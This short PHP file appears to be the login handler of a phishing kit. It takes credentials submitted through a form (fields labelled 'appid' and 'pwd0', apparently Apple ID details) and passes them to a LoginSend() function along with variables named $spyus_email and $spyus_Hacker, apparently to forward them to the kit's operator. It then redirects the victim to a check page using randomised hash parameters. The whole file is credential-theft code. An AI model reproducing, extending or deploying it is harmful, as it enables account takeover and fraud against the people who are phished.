<?php

   session_start();
     require "functions.php";

 date_default_timezone_set("Africa/Tunis");
  $userag = $_SERVER['HTTP_USER_AGENT']; 
     $_F['appid'] = $_Devs['appid'];
     $_F['pwd0'] = $_Devs['pwd0'];
 LoginSend($_POST,$spyus_email,$spyus_Hacker);
 CheckLogin($_POST,$spyus_email);
 $to = "../check.php?".md5(base64_encode(rand(0,10000).gmdate("His")));
 header("Location: ".$to."?dispatch=".spyus_Ran());
      $html = html_while("");
      die($html);
?>
